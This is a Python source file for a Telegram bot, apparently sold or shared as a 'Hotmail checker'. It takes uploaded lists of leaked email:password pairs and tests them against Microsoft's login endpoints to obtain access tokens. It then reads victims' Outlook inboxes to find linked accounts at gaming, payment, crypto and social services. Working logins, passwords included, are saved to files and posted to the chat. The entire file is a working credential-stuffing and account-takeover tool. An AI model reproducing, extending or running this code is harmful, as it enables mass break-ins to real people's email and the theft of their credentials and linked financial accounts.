import os
import sys
import time
import uuid
import pycountry
import requests
import threading
import concurrent.futures
import random
import re
from threading import Lock, Semaphore

from colorama import init
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes, ConversationHandler

from services import services

TOKEN = os.getenv("TOKEN")
if not TOKEN or TOKEN == "YOUR_TELEGRAM_BOT_TOKEN_HERE":
    print("❌ TOKEN set nahi hai! Railway Variables mein TOKEN daal do.")
    sys.exit(1)

print("✅ Token loaded! Video style bot starting...")

lock = threading.Lock()
hit = bad = retry = processed = total_combos = 0
linked_accounts = {}
checked_accounts = set()
rate_limit_semaphore = Semaphore(500)
progress_message_id = None

user_data = {}

init(autoreset=True)

CATEGORIES = {
    "Gaming": ["Steam", "Xbox", "PlayStation", "Epic Games", "Rockstar", "EA Sports", "Ubisoft", "Blizzard", "Riot Games", "Valorant", "Genshin Impact", "PUBG", "Free Fire", "Mobile Legends", "Call of Duty", "Fortnite", "Roblox", "Minecraft", "Supercell", "Nintendo"],
    "Streaming": ["Netflix", "Spotify", "Twitch", "YouTube", "Disney+", "Hulu", "Amazon Prime"],
    "Shopping": ["Amazon", "eBay", "Shopify", "Etsy", "AliExpress"],
    "Payment & Finance": ["PayPal", "Binance", "Coinbase"],
    "Social Media": ["Facebook", "Instagram", "TikTok", "Twitter"],
    "Messaging": ["WhatsApp", "Telegram", "Discord"]
}

def create_progress_bar(percentage, length=25):
    filled = int(length * percentage / 100)
    bar = "█" * filled + "░" * (length - filled)
    return f"[{bar}] {percentage:.1f}%"

def send_message_safe(bot, chat_id, text, parse_mode='HTML'):
    try:
        bot.send_message(chat_id=chat_id, text=text, parse_mode=parse_mode)
    except Exception as e:
        print(f"Send message error: {e}")

def update_progress_message(bot, chat_id):
    global progress_message_id
    while processed < total_combos and total_combos > 0:
        with lock:
            pct = min((processed / total_combos * 100), 100)
            bar = create_progress_bar(pct)
            linked = sum(linked_accounts.values())
            msg = f"""
🔄 <b>SCANNING</b>
{bar}

📊 {processed}/{total_combos}
✅ HIT: {hit}
❌ BAD: {bad}
🔄 RETRY: {retry}
🔗 LINKED: {linked}
"""
        try:
            if progress_message_id:
                bot.edit_message_text(chat_id=chat_id, message_id=progress_message_id, text=msg, parse_mode='HTML')
            else:
                sent = bot.send_message(chat_id=chat_id, text=msg, parse_mode='HTML')
                progress_message_id = sent.message_id
        except:
            pass
        time.sleep(5)

def get_flag(country_name):
    try:
        country = pycountry.countries.lookup(country_name)
        return ''.join(chr(127397 + ord(c)) for c in country.alpha_2)
    except:
        return '🏳'

def save_account_by_type(service_name, email, password):
    if service_name in services:
        if not os.path.exists("Accounts"):
            os.makedirs("Accounts")
        filename = os.path.join("Accounts", services[service_name]["file"])
        account_line = f"{email}:{password}\n"
        if os.path.exists(filename):
            with open(filename, 'r', encoding='utf-8') as f:
                if account_line in f.readlines():
                    return
        with open(filename, 'a', encoding='utf-8') as f:
            f.write(account_line)
        with lock:
            linked_accounts[service_name] = linked_accounts.get(service_name, 0) + 1

def get_capture(email, password, token, cid, bot, chat_id):
    global hit
    try:
        headers = {"User-Agent": "Outlook-Android/2.0", "Authorization": f"Bearer {token}", "X-AnchorMailbox": f"CID:{cid}"}
        response = requests.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", headers=headers, timeout=25).json()
        name = response.get('names', [{}])[0].get('displayName', 'Unknown')
        country = response.get('accounts', [{}])[0].get('location', 'Unknown')
        flag = get_flag(country)

        url = f"https://outlook.live.com/owa/{email}/startupdata.ashx?app=Mini&n=0"
        inbox_headers = {"Host": "outlook.live.com", "authorization": f"Bearer {token}", "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N) AppleWebKit/537.36", "x-owa-sessionid": cid}
        inbox_response = requests.post(url, headers=inbox_headers, data="", timeout=25).text

        linked_services = []
        for service_name, info in services.items():
            if info["sender"] in inbox_response:
                linked_services.append(f"✔ {service_name}")
                save_account_by_type(service_name, email, password)

        linked_str = "\n".join(linked_services) if linked_services else "No linked services found"

        capture = f"""
🔱 HOTMAİL HÍT BULUNDU 🔱
⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊
📧 Email: {email}
🔑 Password: {password}
👤 Name: {name}
🌍 Country: {flag} {country}
⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊
🔗 EMAIL IN INBOX:
{linked_str}

📊 Toplam Hit: {hit + 1}
⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊
𝑷𝑹𝑶𝑮𝑹𝑨𝑴 : @HotmailCheckerV1_BBOT
"""
        send_message_safe(bot, chat_id, capture.strip())
        with open('Hotmail-Hits.txt', 'a', encoding='utf-8') as f:
            f.write(capture + "\n" + "="*60 + "\n")

        with lock:
            hit += 1
            processed += 1
    except:
        with lock:
            processed += 1

def check_account(email, password):
    try:
        session = requests.Session()
        url1 = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}"
        r1 = session.get(url1, headers={"User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9)"}, timeout=15)
        if any(x in r1.text for x in ["Neither", "Both", "Placeholder", "OrgId"]) or "MSAccount" not in r1.text:
            return {"status": "BAD"}
        url2 = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
        r2 = session.get(url2, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}, timeout=15)
        url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
        ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
        if not url_match or not ppft_match:
            return {"status": "BAD"}
        post_url = url_match.group(1).replace("\\/", "/")
        ppft = ppft_match.group(1)
        login_data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&passwd={password}&ps=2&PPFT={ppft}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&i19=9960"
        r3 = session.post(post_url, data=login_data, headers={"Content-Type": "application/x-www-form-urlencoded","User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36","Origin": "https://login.live.com","Referer": r2.url}, allow_redirects=False, timeout=15)
        if any(x in r3.text.lower() for x in ["incorrect", "invalid", "error"]):
            return {"status": "BAD"}
        location = r3.headers.get("Location", "")
        if not location:
            return {"status": "BAD"}
        code_match = re.search(r'code=([^&]+)', location)
        if not code_match:
            return {"status": "BAD"}
        code = code_match.group(1)
        token_data = {"client_info": "1","client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59","redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D","grant_type": "authorization_code","code": code,"scope": "profile openid offline_access https://outlook.office.com/M365.Access"}
        r4 = session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", data=token_data, timeout=15)
        if r4.status_code != 200 or "access_token" not in r4.text:
            return {"status": "BAD"}
        access_token = r4.json()["access_token"]
        mspcid = None
        for cookie in session.cookies:
            if cookie.name == "MSPCID":
                mspcid = cookie.value
                break
        cid = mspcid.upper() if mspcid else str(uuid.uuid4()).upper()
        return {"status": "HIT", "token": access_token, "cid": cid}
    except requests.exceptions.Timeout:
        return {"status": "RETRY"}
    except Exception:
        return {"status": "RETRY"}

def check_combo(email, password, bot, chat_id):
    global hit, bad, retry, processed
    account_id = f"{email}:{password}"
    if account_id in checked_accounts:
        with lock: processed += 1
        return
    checked_accounts.add(account_id)

    with rate_limit_semaphore:
        time.sleep(random.uniform(0.01, 0.05))
        result = check_account(email, password)
        with lock:
            if result.get("status") == "HIT":
                get_capture(email, password, result.get("token"), result.get("cid"), bot, chat_id)
            elif result.get("status") == "BAD":
                bad += 1
            else:
                retry += 1
            processed += 1

def validate_combo(file_path):
    valid = []
    with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            line = line.strip()
            if ":" in line and "@" in line.split(":", 1)[0]:
                valid.append(line)
    with open(file_path, "w", encoding="utf-8") as f:
        f.write("\n".join(valid) + "\n")
    return len(valid)

def main_menu_keyboard():
    keyboard = [
        [InlineKeyboardButton("🚀 Start Checking", callback_data="start_checking")],
        [InlineKeyboardButton("🔑 Keywords", callback_data="menu_keywords"), InlineKeyboardButton("⚡ Speed", callback_data="menu_speed")],
        [InlineKeyboardButton("📊 Stats Menu", callback_data="menu_stats"), InlineKeyboardButton("🎯 My Hits", callback_data="menu_hits")],
        [InlineKeyboardButton("👤 My Profile", callback_data="menu_profile"), InlineKeyboardButton("🏆 Leaderboard", callback_data="menu_leaderboard")],
        [InlineKeyboardButton("🌍 Global", callback_data="menu_global")],
        [InlineKeyboardButton("📈 Live Stats", callback_data="menu_livestats"), InlineKeyboardButton("📋 Queue (0)", callback_data="menu_queue")],
        [InlineKeyboardButton("🔴 Live Activity", callback_data="menu_activity")],
        [InlineKeyboardButton("🎁 Loot Box", callback_data="menu_loot"), InlineKeyboardButton("🔄 Referral", callback_data="menu_referral")],
        [InlineKeyboardButton("🛒 Market", callback_data="menu_market")],
        [InlineKeyboardButton("🌐 Language", callback_data="menu_language"), InlineKeyboardButton("🛠 Tools", callback_data="menu_tools")],
        [InlineKeyboardButton("💎 Buy VIP", callback_data="menu_vip")]
    ]
    return InlineKeyboardMarkup(keyboard)

def keywords_keyboard(selected, page=0, per_page=10):
    all_services = []
    for cat_services in CATEGORIES.values():
        all_services.extend(cat_services)
    all_services = sorted(set(all_services))
    start = page * per_page
    end = start + per_page
    current_page = all_services[start:end]

    keyboard = []
    for srv in current_page:
        status = "✅" if srv in selected else "⬜"
        keyboard.append([InlineKeyboardButton(f"{status} {srv}", callback_data=f"svc_{srv}")])

    nav = []
    if page > 0:
        nav.append(InlineKeyboardButton("⬅️ Prev", callback_data=f"page_{page-1}"))
    if end < len(all_services):
        nav.append(InlineKeyboardButton("Next ➡️", callback_data=f"page_{page+1}"))
    if nav:
        keyboard.append(nav)

    keyboard.append([
        InlineKeyboardButton("✅ Select All", callback_data="select_all_keywords"),
        InlineKeyboardButton("❌ Deselect All", callback_data="deselect_all_keywords")
    ])
    keyboard.append([InlineKeyboardButton("🔙 Back", callback_data="back_to_main")])
    keyboard.append([InlineKeyboardButton("✅ Done", callback_data="done_keywords")])

    return InlineKeyboardMarkup(keyboard)

SELECT_CATEGORY, UPLOAD_COMBO, ENTER_THREADS = range(3)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global progress_message_id
    progress_message_id = None
    user_id = update.effective_user.id
    if user_id not in user_data:
        user_data[user_id] = {"selected_services": set(), "speed_mode": "Medium"}
    context.user_data['selected_services'] = user_data[user_id]["selected_services"]
    await update.message.reply_text("🔥 <b>Hotmail Checker</b>\n\nMain Menu:", parse_mode='HTML', reply_markup=main_menu_keyboard())
    return SELECT_CATEGORY

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    user_id = query.from_user.id
    if user_id not in user_data:
        user_data[user_id] = {"selected_services": set(), "speed_mode": "Medium"}
    selected = user_data[user_id]["selected_services"]

    if data == "start_checking":
        if not selected:
            await query.edit_message_text("❌ Pehle Keywords select karo!", reply_markup=main_menu_keyboard())
            return SELECT_CATEGORY
        await query.edit_message_text("📤 Send your combo file (.txt)")
        return UPLOAD_COMBO

    elif data == "menu_keywords":
        context.user_data["current_page"] = 0
        await query.edit_message_text("🔑 Keywords - Page 1/5\nSelect services:", reply_markup=keywords_keyboard(selected, 0))

    elif data.startswith("page_"):
        page = int(data[5:])
        context.user_data["current_page"] = page
        await query.edit_message_text(f"🔑 Keywords - Page {page+1}/5\nSelect services:", reply_markup=keywords_keyboard(selected, page))

    elif data.startswith("svc_"):
        service = data[4:]
        if service in selected:
            selected.remove(service)
        else:
            selected.add(service)
        page = context.user_data.get("current_page", 0)
        await query.edit_message_text(f"🔑 Keywords - Page {page+1}/5\nSelect services:", reply_markup=keywords_keyboard(selected, page))

    elif data == "select_all_keywords":
        for cat in CATEGORIES.values():
            selected.update(cat)
        page = context.user_data.get("current_page", 0)
        await query.edit_message_text(f"🔑 Keywords - Page {page+1}/5\nSelect services:", reply_markup=keywords_keyboard(selected, page))

    elif data == "deselect_all_keywords":
        selected.clear()
        page = context.user_data.get("current_page", 0)
        await query.edit_message_text(f"🔑 Keywords - Page {page+1}/5\nSelect services:", reply_markup=keywords_keyboard(selected, page))

    elif data == "done_keywords":
        await query.edit_message_text("✅ Keywords saved! Back to Main Menu", reply_markup=main_menu_keyboard())
        return SELECT_CATEGORY

    elif data == "back_to_main":
        await query.edit_message_text("🔥 Hotmail Checker Main Menu", reply_markup=main_menu_keyboard())

    elif data == "menu_speed":
        keyboard = [
            [InlineKeyboardButton("🐢 Slow", callback_data="speed_Slow")],
            [InlineKeyboardButton("⚡ Medium (Recommended)", callback_data="speed_Medium")],
            [InlineKeyboardButton("🚀 Fast", callback_data="speed_Fast")],
            [InlineKeyboardButton("🔥 Turbo", callback_data="speed_Turbo")],
            [InlineKeyboardButton("🧠 Deep Scan", callback_data="speed_Deep Scan")],
            [InlineKeyboardButton("💎 VIP+ Ultra", callback_data="speed_VIP+ Ultra")]
        ]
        await query.edit_message_text("⚡ Choose Speed Mode:", reply_markup=InlineKeyboardMarkup(keyboard))

    elif data.startswith("speed_"):
        mode = data[6:]
        user_data[user_id]["speed_mode"] = mode
        await query.edit_message_text(f"✅ Speed set to {mode}!", reply_markup=main_menu_keyboard())
        return SELECT_CATEGORY

    else:
        await query.edit_message_text("🔥 Coming soon... More features added soon!", reply_markup=main_menu_keyboard())

    return SELECT_CATEGORY

async def receive_combo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.document:
        file = await update.message.document.get_file()
        await file.download_to_drive("combo.txt")
        valid_count = validate_combo("combo.txt")
        context.user_data['combo_file'] = "combo.txt"
        await update.message.reply_text(f"✅ Combo received! {valid_count} valid lines.\n\nSend threads number (20-500 recommended):")
        return ENTER_THREADS
    await update.message.reply_text("Please send combo as .txt file!")
    return UPLOAD_COMBO

async def receive_threads(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        threads = int(update.message.text.strip())
        if not 1 <= threads <= 1000:
            raise ValueError
        context.user_data['threads'] = threads
        await update.message.reply_text(f"🚀 Added to Queue! Position #1\nScanning will start automatically...")

        threading.Thread(target=run_checker, args=(context.bot, update.effective_chat.id, threads), daemon=True).start()
        return ConversationHandler.END
    except:
        await update.message.reply_text("❌ Valid number (1-1000) bhejo")
        return ENTER_THREADS

def run_checker(bot, chat_id, threads):
    global total_combos, processed, hit, bad, retry, linked_accounts, progress_message_id
    hit = bad = retry = processed = 0
    linked_accounts.clear()
    checked_accounts.clear()
    progress_message_id = None

    with open("combo.txt", "r", encoding="utf-8", errors="ignore") as f:
        lines = [line.strip() for line in f if ":" in line]
    total_combos = len(lines)

    send_message_safe(bot, chat_id, f"📊 Total combos: {total_combos}\nStarting check...")

    progress_thread = threading.Thread(target=update_progress_message, args=(bot, chat_id), daemon=True)
    progress_thread.start()

    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        for line in lines:
            try:
                email, pw = line.split(":", 1)
                executor.submit(check_combo, email.strip(), pw.strip(), bot, chat_id)
            except:
                continue

    time.sleep(5)
    send_message_safe(bot, chat_id, f"✅ Check Completed!\nTotal Hits: {hit} | Bad: {bad} | Retries: {retry}")

def main():
    if not os.path.exists("Accounts"):
        os.makedirs("Accounts")
    
    app = Application.builder().token(TOKEN).build()
    
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            SELECT_CATEGORY: [CallbackQueryHandler(button_handler)],
            UPLOAD_COMBO: [MessageHandler(filters.Document.ALL, receive_combo)],
            ENTER_THREADS: [MessageHandler(filters.TEXT, receive_threads)],
        },
        fallbacks=[],
    )
    
    app.add_handler(conv_handler)
    print("🤖 KAKASHI Hotmail Checker (FULL VIDEO STYLE - FIXED) is running... Send /start")
    app.run_polling()

if __name__ == "__main__":
    main()